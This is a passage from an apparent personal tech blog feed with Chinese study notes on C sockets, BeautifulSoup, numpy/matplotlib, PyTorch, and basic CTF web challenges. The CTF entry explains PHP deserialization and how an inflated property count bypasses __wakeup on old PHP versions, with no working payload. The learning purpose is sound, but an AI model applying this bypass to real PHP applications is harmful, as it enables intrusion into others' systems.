class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种</span></span><br><span class="line">inet_aton(server_addr_string,&amp;myaddr.sin_addr); <span class="comment">//myaddr是一个sockaddr_in的结构体</span></span><br><span class="line"><span class="comment">//第二种</span></span><br><span class="line">myaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;这里写你要输入的ip地址，ipv4格式的就好了&quot;</span>)    </span><br></pre></td></tr></table></figure><h2 id="给端口赋值"><a href="#给端口赋值" class="headerlink" title="给端口赋值"></a>给端口赋值</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myaddr.sin_port = htons(端口数目)  <span class="comment">//括号里面就是数字就好了</span></span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sockfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">my_addr</span>;</span></span><br><span class="line">sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>); <span class="comment">/* 套接字创建，返回值如果是-1就代表没创建成功 */</span></span><br><span class="line"></span><br><span class="line">my_addr.sin_family = AF_INET; <span class="comment">/* 主机字节序 这里指使用ipv4 */</span> </span><br><span class="line">my_addr.sin_port = htons(MYPORT); <span class="comment">/* short, 网络字节序 */</span></span><br><span class="line">my_addr.sin_addr.s_addr = inet_addr(“<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>″);</span><br><span class="line"></span><br><span class="line">bzero(&amp;(my_addr.sin_zero), <span class="number">8</span>); <span class="comment">/* zero the rest of the struct */</span></span><br><span class="line"><span class="comment">/* bind()表示与my_addr中的ip地址来进行连接 */</span></span><br><span class="line">bind(sockfd, (struct sockaddr *)&amp;my_addr, <span class="keyword">sizeof</span>(struct sockaddr));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考博客：<a href="https://blog.csdn.net/will130/article/details/53326740">https://blog.csdn.net/will130/article/details/53326740</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;C语言网络编程中有很多结构体，其中很多的结构体对我来说很混乱，难以记住，想要先整理一下&lt;/p&gt;
&lt;h1 id=&quot;用来处理网络通信的地址&quot;&gt;&lt;a href=&quot;#用来处理网络通信的地址&quot; class=&quot;headerlink&quot; title=&quot;用来处理网络通信的地址&quot;&gt;&lt;/a&gt;用来</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="学习笔记" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习" scheme="https://thanyi.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>关于python中beautifulsoup库的用法(超简单)</title>
    <link href="https://thanyi.github.io/2021/09/09/016%E5%85%B3%E4%BA%8Epython%E4%B8%ADbeautiful%E5%BA%93%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <id>https://thanyi.github.io/2021/09/09/016%E5%85%B3%E4%BA%8Epython%E4%B8%ADbeautiful%E5%BA%93%E7%9A%84%E7%94%A8%E6%B3%95/</id>
    <published>2021-09-09T07:19:01.000Z</published>
    <updated>2021-09-09T16:35:27.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前有节实验课研究了爬虫，我深刻地感觉到了xpath就不适合玩爬虫（个人见解），于是我开始试着重新复习beautifulsoup库了</p><h1 id="beautifulsoup库的使用"><a href="#beautifulsoup库的使用" class="headerlink" title="beautifulsoup库的使用"></a>beautifulsoup库的使用</h1><h2 id="安装和引用"><a href="#安装和引用" class="headerlink" title="安装和引用"></a>安装和引用</h2><p>安装直接pip安装就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install bs4</span><br></pre></td></tr></table></figure><p>引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></table></figure><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(res_text,<span class="string">&quot;html.parser&quot;</span>,from_encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><p>html.parser 是一个算是用于解释html文档的东西</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先我需要一个html文档，一般来说是用了requests模块以后得来的content</p><p>然后使用的语法</p><h4 id="查找标签"><a href="#查找标签" class="headerlink" title="查找标签"></a>查找标签</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test1 = soup.findAll(<span class="string">&#x27;a&#x27;</span>) </span><br><span class="line"><span class="comment">#这个是指我要这个文档里面所有的a标签，包括了&lt;a&gt;一起，有一个像是list的返回，类型叫做ResultSet</span></span><br><span class="line">test2 = soup.findAll(<span class="string">&#x27;a&#x27;</span>,class_=<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="comment">#在上面的基础上，我要的是所有class是&#x27;xxx&#x27;的标签</span></span><br><span class="line">test3 = soup.findAll(<span class="string">&#x27;a&#x27;</span>,class_=<span class="string">&#x27;xxx&#x27;</span>,text=<span class="string">&#x27;story&#x27;</span>)</span><br><span class="line"><span class="comment">#标签里面的文本筛选</span></span><br></pre></td></tr></table></figure><p>我们还可以和著名的re库，也就是正则表达式一起用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test4 = soup.findAll(<span class="string">&#x27;a&#x27;</span>,class_=<span class="string">&#x27;xxx&#x27;</span>,text=re.<span class="built_in">compile</span>(<span class="string">&#x27;.*?story.*?&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="查找标签里的内容"><a href="#查找标签里的内容" class="headerlink" title="查找标签里的内容"></a>查找标签里的内容</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> test1:</span><br><span class="line">print(item.get_text())</span><br><span class="line"><span class="comment">#get_text()可以把标签里面的内容全部弄出来，不管你是不是普通的text，还是有&lt;em&gt;标签，都可以</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前有节实验课研究了爬虫，我深刻地感觉到了xpath就不适合玩爬虫（个人见解），于是我开始试着重新复习beautifulsoup库了&lt;/p&gt;</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="python库" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/python%E5%BA%93/"/>
    
    
    <category term="python" scheme="https://thanyi.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>numpy的学习笔记</title>
    <link href="https://thanyi.github.io/2021/09/08/015python%E4%B8%ADnumpy%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <id>https://thanyi.github.io/2021/09/08/015python%E4%B8%ADnumpy%E7%9A%84%E7%94%A8%E6%B3%95/</id>
    <published>2021-09-08T13:51:58.000Z</published>
    <updated>2021-09-14T01:39:14.443Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>众所周知，numpy是机器学习和深度学习的基础，数据运算在数据挖掘领域也是有着丰富的用途，numpy、matplotlib的用法是很基础的事情，这里稍微总结一下，知识不多，学多少总结多少</p><p>菜鸟教程相关内容有很多，这里给个链接，我只总结一下少数东西</p><h1 id="numpy的一些小用法"><a href="#numpy的一些小用法" class="headerlink" title="numpy的一些小用法"></a>numpy的一些小用法</h1><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>在numpy中的数组，其实就是我们在线性代数中学习的矩阵，矩阵在线性代数的地位自然不用我多说，所以numpy、matplotlib中很多东西都离不开这个数组</p><h2 id="数组创建（从头创建）"><a href="#数组创建（从头创建）" class="headerlink" title="数组创建（从头创建）"></a>数组创建（从头创建）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.empty([<span class="number">3</span>,<span class="number">3</span>]) <span class="comment">#x是一个3行3列的矩阵，里面都是一些随机数，因为没有初始化</span></span><br><span class="line">y = np.zeros((<span class="number">2</span>,<span class="number">2</span>), dtype = np.<span class="built_in">int</span>) <span class="comment">#这个是全是0的2*2矩阵</span></span><br><span class="line">z = np.ones((<span class="number">2</span>,<span class="number">2</span>), dtype = np.<span class="built_in">int</span>) <span class="comment">#和上面一样</span></span><br></pre></td></tr></table></figure><p>这就是普通的从头开始创建</p><h2 id="数组创建（按数值范围创建）"><a href="#数组创建（按数值范围创建）" class="headerlink" title="数组创建（按数值范围创建）"></a>数组创建（按数值范围创建）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = numpy.arange(<span class="number">5</span>) <span class="comment">#[0  1  2  3  4] 这就是按照一个范围来的</span></span><br><span class="line">y = numpy.arange(<span class="number">10</span>,<span class="number">20</span>,<span class="number">2</span>) <span class="comment">#[10  12  14  16  18] 从10到20，步长为2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这个是一维数组的创建，等差数列的创建，从1到10，创10个</span></span><br><span class="line">x1 = numpy.linspace(<span class="number">1</span>,<span class="number">10</span>,<span class="number">10</span>) <span class="comment">#[ 1.  2.  3.  4.  5.  6.  7.  8.  9. 10.]</span></span><br><span class="line"><span class="comment">#这个是一维数组的创建，并且有一个间距展示</span></span><br><span class="line">y1 = numpy.linspace(<span class="number">1</span>,<span class="number">10</span>,<span class="number">10</span>,retstep= <span class="literal">True</span>)</span><br><span class="line"><span class="comment">#(array([ 1.,  2.,  3.,  4.,  5.,  6.,  7.,  8.,  9., 10.]), 1.0)</span></span><br></pre></td></tr></table></figure><h2 id="更改数组的形状"><a href="#更改数组的形状" class="headerlink" title="更改数组的形状"></a>更改数组的形状</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b =np.linspace(<span class="number">1</span>,<span class="number">10</span>,<span class="number">10</span>).reshape([<span class="number">10</span>,<span class="number">1</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[ 1.]</span></span><br><span class="line"><span class="string"> [ 2.]</span></span><br><span class="line"><span class="string"> [ 3.]</span></span><br><span class="line"><span class="string"> [ 4.]</span></span><br><span class="line"><span class="string"> [ 5.]    变成了一个【10,1】的矩阵</span></span><br><span class="line"><span class="string"> [ 6.]</span></span><br><span class="line"><span class="string"> [ 7.]</span></span><br><span class="line"><span class="string"> [ 8.]</span></span><br><span class="line"><span class="string"> [ 9.]</span></span><br><span class="line"><span class="string"> [10.]]   </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一个等差数列的np.logspace(),是同一种的用法</p><h1 id="matplotlib用法"><a href="#matplotlib用法" class="headerlink" title="matplotlib用法"></a>matplotlib用法</h1><p>菜鸟教程：<a href="https://www.runoob.com/matplotlib/matplotlib-tutorial.html">https://www.runoob.com/matplotlib/matplotlib-tutorial.html</a></p><h2 id="matplotlib中的pyplot子库"><a href="#matplotlib中的pyplot子库" class="headerlink" title="matplotlib中的pyplot子库"></a>matplotlib中的pyplot子库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">0</span>, <span class="number">6</span>])</span><br><span class="line">y = np.array([<span class="number">0</span>, <span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">plt.plot(x, y) <span class="comment">#拿着两个矩阵进去居然是！</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210908214821.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xpoints &#x3D; np.array([1, 2, 6, 8])</span><br><span class="line">ypoints &#x3D; np.array([3, 8, 1, 10])</span><br><span class="line"></span><br><span class="line">plt.plot(xpoints, ypoints)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210908214849.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;众所周知，numpy是机器学习和深度学习的基础，数据运算在数据挖掘领域也是有着丰富的用途，numpy、matplotlib的用法是很基础的事</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="numpy" scheme="https://thanyi.github.io/tags/numpy/"/>
    
  </entry>
  
  <entry>
    <title>ctf基础题02</title>
    <link href="https://thanyi.github.io/2021/08/07/014ctf%E5%9F%BA%E7%A1%80%E9%A2%9802/"/>
    <id>https://thanyi.github.io/2021/08/07/014ctf%E5%9F%BA%E7%A1%80%E9%A2%9802/</id>
    <published>2021-08-07T13:51:58.000Z</published>
    <updated>2021-08-14T09:51:26.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><p>知识点总结：</p><p><strong>一、关于phps</strong></p><p>这是个没有想到的网站名，需要记一下</p><p><strong>二、urldecode/urlencode</strong></p><p>这是将不是英文和数字（准确来说是非ascii码的字符）进行一次url实体编码和解码的行为</p><p>注意：在浏览器中，输入的参数是会先经过url实体编码，变成形如%12（%和两个十六进制）的样子，再进行运算</p><h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>总结：</p><p>一、关于序列化和反序列化</p><p>总的来说就是php中的对象和字符串之间互相转换的一种方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------序列化之后-------------------------</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>注意：在序列化之后只会有变量存储在字符串中，对象的方法就不会（大概是因为这些方法一开始就存储在硬盘中而不是内存中，不会在完成一段程序之后被销毁吧）</p><p>二、魔法方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()和__sleep()方法</span><br><span class="line">__wakeup方法针对反序列化</span><br><span class="line">__sleep方法针对序列化</span><br><span class="line">这两个方法的意思都是 当开始序列化或者开始反序列化时</span><br><span class="line">会优先使用这两个魔法方法，在得到序列化（反序列化）结果的同时得到魔法方法使用结果</span><br></pre></td></tr></table></figure><p>比如上一个class中，在实现反序列化之前，会先执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br></pre></td></tr></table></figure><p>三、魔法方法漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">只是针对__wakeup()方法</span><br><span class="line">在给入的参数中属性的数目大于真实的属性数目时，会绕开__wakeup函数</span><br><span class="line">注意：PHP5&lt;<span class="number">5.6</span><span class="number">.25</span></span><br><span class="line"> PHP7&lt;<span class="number">7.0</span><span class="number">.10</span></span><br><span class="line">才行</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php2&quot;&gt;&lt;a href=&quot;#php2&quot; class=&quot;headerlink&quot; title=&quot;php2&quot;&gt;&lt;/a&gt;php2&lt;/h1&gt;&lt;p&gt;知识点总结：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、关于phps&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是个没有想到的网站名，需要记</summary>
      
    
    
    
    <category term="ctf" scheme="https://thanyi.github.io/categories/ctf/"/>
    
    <category term="基础" scheme="https://thanyi.github.io/categories/ctf/%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="ctf" scheme="https://thanyi.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>关于NLP的学习</title>
    <link href="https://thanyi.github.io/2021/08/06/013NLP%E5%AD%A6%E4%B9%A0_pytorch/"/>
    <id>https://thanyi.github.io/2021/08/06/013NLP%E5%AD%A6%E4%B9%A0_pytorch/</id>
    <published>2021-08-06T15:37:53.000Z</published>
    <updated>2021-09-14T01:37:20.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深度学习的概念"><a href="#深度学习的概念" class="headerlink" title="深度学习的概念"></a>深度学习的概念</h1><p>深度学习从广义上来讲就是程序可以自己学习自己的意思。是指一个已经写好的代码程序经过大量的数据使得自身得到了发展</p><p>总共有三个部分的特征：</p><p>一、反向传播算法</p><p>二、特征提取能力</p><p>三、端到端之间的学习方法</p><h1 id="学习pytorch"><a href="#学习pytorch" class="headerlink" title="学习pytorch"></a>学习pytorch</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>中间有三个特点：</p><p>1、完全符合python编程（tensorflow就不行，是在python语法和TensorFlow自己有些格式之间转换）</p><p>2、方便的张量（tensor）计算 –&gt;可以将变量加载到GPU（图形处理器）上</p><p>3、对动态计算图的支持 —-&gt;动态计算图，是pytorch的特有特性，是可以用来表示反向传播算法的一种图示</p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210806235217.png"><h2 id="使用pytorch进行深度学习的步骤"><a href="#使用pytorch进行深度学习的步骤" class="headerlink" title="使用pytorch进行深度学习的步骤"></a>使用pytorch进行深度学习的步骤</h2><h3 id="构建神经网络模型"><a href="#构建神经网络模型" class="headerlink" title="构建神经网络模型"></a>构建神经网络模型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">neu = torch.nn.Sequential(</span><br><span class="line">torch.nn.Linear(input_size,hidden_size), <span class="comment">#输入层到隐含层之间的线性运算</span></span><br><span class="line">torch.nn.Sigmoid(),<span class="comment">#作用在对隐含层的每一个神经元</span></span><br><span class="line">torch.nn.Linear(hidden_size,output_size),  <span class="comment">#从隐含层到输出层的线性运算</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这个格式的参数输入可以将所有神经网络的参数储存在neu.parameters中</p><p><strong>其中输入层的每一个神经元都是多维向量的一个维度</strong></p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210807204929.png"></p><h3 id="建立损失函数和优化器"><a href="#建立损失函数和优化器" class="headerlink" title="建立损失函数和优化器"></a>建立损失函数和优化器</h3><h4 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h4><p>用来评价模型的<strong>预测值</strong>和<strong>真实值</strong>不一样的程度，损失函数越好，通常模型的性能越好。不同的模型用的损失函数一般也不一样。</p><p>pytorch中的损失函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cost = torch.nn.MSELoss()</span><br></pre></td></tr></table></figure><p>torch.nn.MSELoss() &lt;——–&gt;  torch.mean((y-y*)^2)</p><p>意识是预测值和真实值差的平方的平均值</p><p>cost是函数指针，指向这个mseloss函数</p><h4 id="优化器"><a href="#优化器" class="headerlink" title="优化器"></a>优化器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimizer = torch.optim.SGD(neu.parameters(),lr=<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure><p>neu.parameters是定义好的神经网络中的所有等待被优化的所有参数的集合</p><p>lr是学习效率参数</p><h3 id="对神经网络进行分批次训练"><a href="#对神经网络进行分批次训练" class="headerlink" title="对神经网络进行分批次训练"></a>对神经网络进行分批次训练</h3><h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><h2 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h2><p>类型变量：数值的大小没有特殊的含义。比如说预测当地此时具有的共享单车数的时候的”星期几”这个变量。与之相对的是–特征变量(特征属性，在一个表中的特征列)</p><h2 id="预处理手段"><a href="#预处理手段" class="headerlink" title="预处理手段"></a>预处理手段</h2><p>一、对类型变量进行类型编码，比如one-hot编码</p><p>二、数据变量标准化(归一化)，对数值变量进行统一化运算，使其更加方便运算。(比如对数据减去均值再除以方差)</p><p> <img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210807203214.png"></p><p>三、分批训练，将其分类为训练集、测试集。还有将其切分成小批，一批一批地进入神经网络，每一批训练网络一次</p><h1 id="实例：关于分类相关的深度学习"><a href="#实例：关于分类相关的深度学习" class="headerlink" title="实例：关于分类相关的深度学习"></a>实例：关于分类相关的深度学习</h1><p>例子：文本分类的问题</p><h2 id="文本向量化"><a href="#文本向量化" class="headerlink" title="文本向量化"></a>文本向量化</h2><p>文本向量化是将一个不固定长度的文本变成一个固定长度的向量</p><p>所采用的技术就是<strong>词袋模型</strong></p><p><strong>词袋模型</strong>是指将一段文本的所有词视为一个装满文本的大袋子，忽略单词之间的顺序，只看频率，并且将这个大袋子中的单词全部变成向量，有多少个单词就是多少维的向量</p><p>举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我 爱 北京 天安门</span><br><span class="line">每个 人 都有 一个 爱 的 人</span><br></pre></td></tr></table></figure><p>那么我们对应的单词表就是</p><p>{我，爱，北京，天安门，每个，人，都有，一个，的}—–&gt; 九维向量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我 爱 北京 天安门</span><br><span class="line">&#123;1&#x2F;4，1&#x2F;4，1&#x2F;4，1&#x2F;4，0，0，0，0，0&#125;  #向量表示</span><br><span class="line">每个 人 都有 一个 爱 的 人</span><br><span class="line">&#123;0，1&#x2F;7，0，0，1&#x2F;7，2&#x2F;7，1&#x2F;7，1&#x2F;7，1&#x2F;7&#125; #向量表示</span><br></pre></td></tr></table></figure><h2 id="构造分类器"><a href="#构造分类器" class="headerlink" title="构造分类器"></a>构造分类器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">model &#x3D; nn.Sequential(</span><br><span class="line">nn.Linear(input_size,hidden_size),</span><br><span class="line">nn.ReLU(), #在计算的速度上更快，并且有利于梯度信息的传递，在一定程度上避免了梯度爆炸的问题</span><br><span class="line">nn.Linear(hidden_size,2), #2是因为这个就是个分类，我们假设分成2类</span><br><span class="line">nn.LogSoftmax(dim&#x3D;), #用于解决分类问题的分类输出层计算</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="pytorch的工具"><a href="#pytorch的工具" class="headerlink" title="pytorch的工具"></a>pytorch的工具</h1><h2 id="TensorBoard的使用"><a href="#TensorBoard的使用" class="headerlink" title="TensorBoard的使用"></a>TensorBoard的使用</h2><p>TensorBoard是一个对于我们想要展示的图片的展示平台</p><p>在存在pytorch的环境里面的终端使用命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tensorboard --logdir logs(这个是你规定的文件夹名) --port 你的端口</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210913155329.png"></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>首先需要导入包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure><p>对SummaryWriter生成对象，使用PIL来将路径中的图片来变成对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">writer &#x3D; SummaryWriter(&#39;logs&#39;)</span><br><span class="line">img_path &#x3D; &#39;data&#x2F;train&#x2F;ants_img&#x2F;5650366_e22b7e1065.jpg&#39;</span><br><span class="line">image_PIL &#x3D; Image.open(img_path)</span><br></pre></td></tr></table></figure><p>使用numpy把PIL的对象变成numpy的数组，再导入进Writer对象，（writer中只接受numpy数组或者其他的参数，反正PIL的不行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">img_array = np.array(image_PIL)</span><br><span class="line">writer.add_image(<span class="string">&#x27;train&#x27;</span>,img_array,<span class="number">1</span>,dataformats=<span class="string">&#x27;HWC&#x27;</span>) </span><br><span class="line">//参数分别是名字，数组（数据），<span class="number">1</span>是指step，每次变的话可要在tensorboard上有很多步骤，hwc是一种格式问题</span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/013NLP%E5%AD%A6%E4%B9%A0_pytorch/Users\ethanyi\AppData\Roaming\Typora\typora-user-images\image-20210913162314922.png" alt="image-20210913162314922"></p><p>或者我如果想要添加数组，做图像</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 